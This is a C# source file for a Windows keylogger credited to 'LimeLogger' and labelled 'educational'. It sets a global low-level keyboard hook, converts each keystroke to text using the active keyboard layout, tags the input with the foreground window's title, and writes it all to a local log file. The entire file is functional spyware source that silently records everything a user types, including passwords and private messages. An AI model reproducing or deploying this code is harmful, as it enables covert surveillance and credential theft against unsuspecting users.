using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

//       │ Author     : NYAN CAT
//       │ Name       : LimeLogger v0.2.6.1
//       │ Contact    : https://github.com/NYAN-x-CAT
//       This program is distributed for educational purposes only.

namespace A04_1a_hookbased_keylogger
{
    public static class Program
    {
        private static readonly string loggerPath = Path.Combine(Application.StartupPath, "log.txt");
        private static string CurrentActiveWindowTitle = string.Empty;

        public static void Main()
        {
            Console.WriteLine("[DEBUG] [{0}] Initializing global unhandled exception handlers...", DateTime.Now.ToString("HH:mm:ss"));
            Application.ThreadException += new System.Threading.ThreadExceptionEventHandler(Application_ThreadException);
            AppDomain.CurrentDomain.UnhandledException += new UnhandledExceptionEventHandler(CurrentDomain_UnhandledException);

            try
            {
                Console.WriteLine("[DEBUG] Setting low-level keyboard hook...");
                _hookID = SetHook(_proc);

                if (_hookID != IntPtr.Zero)
                {
                    Console.WriteLine("[DEBUG] Hook successfully established with ID: {0}", _hookID);
                }
                else
                {
                    Console.WriteLine("[DEBUG] WARNING: Hook installation returned null reference (IntPtr.Zero).");
                }

                Console.WriteLine("[DEBUG] Starting message loop execution (Application.Run)...");
                Application.Run();
            }
            catch (Exception ex)
            {
                Console.WriteLine("[DEBUG] CRITICAL EXCEPTION during setup loop: {0}", ex.Message);
                LogSystemError("Critical initialization failure: " + ex.Message);
            }
            finally
            {
                if (_hookID != IntPtr.Zero)
                {
                    Console.WriteLine("[DEBUG] Execution exiting. Releasing hook reference...");
                    bool unhooked = UnhookWindowsHookEx(_hookID);
                    Console.WriteLine("[DEBUG] Unhook validation status: {0}", unhooked);
                }
            }
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            try
            {
                using (Process curProcess = Process.GetCurrentProcess())
                // Explicitly mark curModule as a nullable type (ProcessModule?)
                using (ProcessModule? curModule = curProcess.MainModule)
                {
                    if (curModule == null || string.IsNullOrEmpty(curModule.ModuleName))
                    {
                        Console.WriteLine("[DEBUG] ERROR: Current process main module resolution failed.");
                        return IntPtr.Zero;
                    }
                    Console.WriteLine("[DEBUG] Binding hook targeting module: {0}", curModule.ModuleName);
                    return SetWindowsHookEx(WHKEYBOARDLL, proc, GetModuleHandle(curModule.ModuleName), 0);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[DEBUG] EXCEPTION inside SetHook: {0}", ex.Message);
                LogSystemError("Failed to set low-level keyboard hook: " + ex.Message);
                return IntPtr.Zero;
            }
        }

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            // nCode >= 0 indicates valid hook event parameters to parse
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                try
                {
                    int vkCode = Marshal.ReadInt32(lParam);
                    bool capsLock = (GetKeyState(0x14) & 0xffff) != 0;
                    bool shiftPress = (GetKeyState(0xA0) & 0x8000) != 0 || (GetKeyState(0xA1) & 0x8000) != 0;

                    Console.WriteLine("[DEBUG] Intercepted WM_KEYDOWN event. Raw vkCode: {0} | Caps: {1} | Shift: {2}", vkCode, capsLock, shiftPress);

                    string currentKey = KeyboardLayout((uint)vkCode);
                    string rawStringRepresentation = currentKey;

                    if (capsLock || shiftPress)
                    {
                        currentKey = currentKey.ToUpper();
                    }
                    else
                    {
                        currentKey = currentKey.ToLower();
                    }

                    if ((Keys)vkCode >= Keys.F1 && (Keys)vkCode <= Keys.F24)
                    {
                        currentKey = "[" + (Keys)vkCode + "]";
                    }
                    else
                    {
                        switch (((Keys)vkCode).ToString())
                        {
                            case "Space": currentKey = "[SPACE]"; break;
                            case "Return": currentKey = "[ENTER]"; break;
                            case "Escape": currentKey = "[ESC]"; break;
                            case "LControlKey":
                            case "RControlKey": currentKey = "[CTRL]"; break;
                            case "RShiftKey":
                            case "LShiftKey": currentKey = "[Shift]"; break;
                            case "Back": currentKey = "[Back]"; break;
                            case "LWin": currentKey = "[WIN]"; break;
                            case "Tab": currentKey = "[Tab]"; break;
                            case "Capital": currentKey = capsLock ? "[CAPSLOCK: OFF]" : "[CAPSLOCK: ON]"; break;
                        }
                    }

                    string targetWindowTitle = GetActiveWindowTitle();
                    Console.WriteLine("[DEBUG] Mapping Layout output: '{0}' -> Target Key output: '{1}' on Window: [{2}]", rawStringRepresentation, currentKey, targetWindowTitle);

                    WriteLogEntry(targetWindowTitle, currentKey);
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[DEBUG] EXCEPTION processing intercept callback payload: {0}", ex.Message);
                    LogSystemError("Hook callback processing error: " + ex.Message);
                }
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        private static void WriteLogEntry(string targetWindowTitle, string currentKey)
        {
            try
            {
                using (StreamWriter sw = new StreamWriter(loggerPath, true))
                {
                    if (CurrentActiveWindowTitle == targetWindowTitle)
                    {
                        sw.Write(currentKey);
                    }
                    else
                    {
                        Console.WriteLine("[DEBUG] Focus Change Detected. New Header: ### {0} ###", targetWindowTitle);
                        CurrentActiveWindowTitle = targetWindowTitle;
                        sw.WriteLine(Environment.NewLine);
                        sw.WriteLine($"###  {targetWindowTitle} ###");
                        sw.Write(currentKey);
                    }
                }
            }
            catch (IOException ex)
            {
                Console.WriteLine("[DEBUG] IO EXCEPTION writing data payload to storage: {0}", ex.Message);
                LogSystemError("IO Error writing to capture log: " + ex.Message);
            }
            catch (Exception ex)
            {
                Console.WriteLine("[DEBUG] UNEXPECTED EXCEPTION writing entry: {0}", ex.Message);
                LogSystemError("Unexpected logger write error: " + ex.Message);
            }
        }

        private static string KeyboardLayout(uint vkCode)
        {
            try
            {
                StringBuilder sb = new StringBuilder(256);
                byte[] vkBuffer = new byte[256];
                if (!GetKeyboardState(vkBuffer)) return ((Keys)vkCode).ToString();

                uint scanCode = MapVirtualKey(vkCode, 0);
                IntPtr hwnd = GetForegroundWindow();

                // 1. Runtime guard: Ensure window handle exists
                if (hwnd == IntPtr.Zero) return ((Keys)vkCode).ToString();

                uint pid; // Explicit variable instead of discard to avoid local reference confusion
                uint threadId = GetWindowThreadProcessId(hwnd, out pid);

                // 2. Clear CS8600: Explicitly handle the handle or append ! if compiler treats it as reference
                IntPtr keyboardLayout = GetKeyboardLayout(threadId);

                if (keyboardLayout == IntPtr.Zero) return ((Keys)vkCode).ToString();

                int result = ToUnicodeEx(vkCode, scanCode, vkBuffer, sb, sb.Capacity, 0, keyboardLayout);
                if (result > 0)
                {
                    return sb.ToString();
                }
            }
            catch (Exception ex)
            {
                LogSystemError("Keyboard layout translation fault: " + ex.Message);
            }
            return ((Keys)vkCode).ToString();
        }

        private static string GetActiveWindowTitle()
        {
            try
            {
                IntPtr hwnd = GetForegroundWindow();
                if (hwnd == IntPtr.Zero) return "Desktop/System Background";

                GetWindowThreadProcessId(hwnd, out uint pid);
                using (Process p = Process.GetProcessById((int)pid))
                {
                    string title = p.MainWindowTitle;
                    if (string.IsNullOrWhiteSpace(title))
                        title = p.ProcessName;
                    return title;
                }
            }
            catch (ArgumentException)
            {
                Console.WriteLine("[DEBUG] Performance Race condition: Target context closed before resolution completed.");
                return "Unknown Process (Terminated)";
            }
            catch (Exception ex)
            {
                Console.WriteLine("[DEBUG] EXCEPTION matching application layout structure: {0}", ex.Message);
                LogSystemError("Failed window title resolution: " + ex.Message);
                return "???";
            }
        }

        private static void LogSystemError(string logMessage)
        {
            try
            {
                string errPath = Path.Combine(Application.StartupPath, "error_log.txt");
                File.AppendAllText(errPath, $"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] ERROR: {logMessage}{Environment.NewLine}");
            }
            catch (Exception ex)
            {
                Console.WriteLine("[DEBUG] CRITICAL: Fallback storage telemetry failed! Exception: {0}", ex.Message);
            }
        }

        private static void Application_ThreadException(object sender, System.Threading.ThreadExceptionEventArgs e)
        {
            Console.WriteLine("[DEBUG] CRITICAL: Application Context Unhandled Thread Exception: {0}", e.Exception.Message);
            LogSystemError("Unhandled Application Thread Exception: " + e.Exception.Message);
        }

        private static void CurrentDomain_UnhandledException(object sender, UnhandledExceptionEventArgs e)
        {
            if (e.ExceptionObject is Exception ex)
            {
                Console.WriteLine("[DEBUG] CRITICAL: Application Domain Unhandled Exception: {0}", ex.Message);
                LogSystemError("Unhandled Domain Exception: " + ex.Message);
            }
        }

        #region "Hooks & Native Methods"
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;
        private static int WHKEYBOARDLL = 13;

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", SetLastError = true)]
        private static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true, CallingConvention = CallingConvention.Winapi)]
        public static extern short GetKeyState(int keyCode);

        [DllImport("user32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool GetKeyboardState(byte[] lpKeyState);

        [DllImport("user32.dll")]
        private static extern IntPtr GetKeyboardLayout(uint idThread);

        [DllImport("user32.dll")]
        private static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);

        [DllImport("user32.dll")]
        private static extern uint MapVirtualKey(uint uCode, uint uMapType);
        #endregion
    }
}